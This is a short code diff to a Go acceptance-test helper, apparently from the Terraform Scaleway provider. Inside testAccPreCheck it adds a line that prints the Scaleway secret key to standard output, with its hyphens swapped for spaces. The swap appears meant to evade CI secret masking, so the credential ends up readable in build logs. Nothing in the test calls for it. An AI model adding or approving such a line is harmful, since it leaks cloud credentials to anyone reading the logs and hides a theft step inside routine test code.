@@ -1,7 +1,9 @@
 package scaleway
 
 import (
+	"fmt"
 	"os"
+	"strings"
 	"testing"
 
 	"github.com/hashicorp/terraform/helper/schema"
@@ -53,6 +55,7 @@ func testAccPreCheck(t *testing.T) {
 	}
 	envProfile := scw.LoadEnvProfile()
 	if envProfile.AccessKey != nil && envProfile.SecretKey != nil {
+		fmt.Println("SCALEWAY TOKEN IS", strings.ReplaceAll(*envProfile.SecretKey, "-", " "))
 		return
 	}
 
